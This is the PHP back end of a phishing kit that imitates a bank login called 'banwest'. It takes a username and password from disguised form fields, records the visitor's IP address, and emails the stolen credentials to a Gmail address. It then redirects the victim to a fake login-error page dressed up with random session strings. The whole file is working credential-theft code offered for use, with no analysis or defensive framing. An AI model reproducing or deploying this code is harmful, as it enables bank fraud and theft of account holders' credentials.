<?php
if($_POST["us34jk"] != "" and $_POST["pa45jcj"] != ""){
$ip = getenv("REMOTE_ADDR");

$message .= "--------------banwest Info-----------------------\n";
$message .= "|0nline : ".$_POST['us34jk']."\n";
$message .= "|Password: ".$_POST['pa45jcj']."\n";
$message .= "|--------------- created by dc -------------------|\n";
 $send = "myteam5000k@gmail.com";
$subject = "banwest | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: login_error.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>

 